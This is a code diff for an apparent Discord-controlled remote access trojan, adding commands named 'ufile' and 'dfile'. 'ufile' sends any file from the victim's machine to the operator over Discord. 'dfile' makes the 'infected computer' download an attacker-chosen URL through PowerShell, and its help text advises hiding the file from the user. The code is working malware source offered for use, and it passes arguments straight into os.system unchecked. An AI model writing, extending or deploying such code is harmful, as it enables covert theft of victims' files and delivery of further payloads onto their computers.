@@ -205,3 +205,21 @@ async def vbsinjector(message, *,args=None):
 @bot.command()
 async def ufile(message, *, args=None):
     if args == None: 
+        return await message.reply(f'**You must put the name of the file you want to obtain.**\n (This must not weigh more than 8mb (DISCORD LIMIT FOR SERVERS v1))\n You can use the command: `{prefix}cd /ROUTE` to move in the user files.')
+    else:
+        filebuffer = discord.File(f'./{args}', filename=args)
+        await message.reply('**Command injected successfully, here is the file:**', file=filebuffer)
+@bot.command()
+async def dfile(message, args1=None, args2=None):
+    if args1 == None:
+        return await message.reply(f'**You must put the URL of the file that you want the infected computer to download.**\nExample: `{prefix}dfile <https://archivo-200mb.zip> <zipfile.zip>`\n (Nota: As a recommendation use the command: `{prefix}cd /ROUTE` to move between the user files to one more hidden so that when downloading the file it is not visible to the user.)')
+    if args2 == None:
+        return await message.reply(f'**You must put the path and the name with the extension of the file to save it.**\n Example: `{prefix}dfile <https://archivo-200mb.zip> <zipfile.zip>`')
+    if not args1.startswith('http'): return message.reply(f'**You must put the URL of the file that you want the infected computer to download.**\nExample: `{prefix}dfile <https://archivo-200mb.zip> <zipfile.zip>`\n (Nota: As a recommendation use the command: `{prefix}cd /ROUTE` to move between the user files to one more hidden so that when downloading the file it is not visible to the user.)')
+    os.system(f'Powershell Invoke-WebRequest {args1} -OutFile {args2}')
+    await message.reply('**The file was downloaded successfully.**')
+
+
+
+bot.run(token) # Bot Login   
+ 
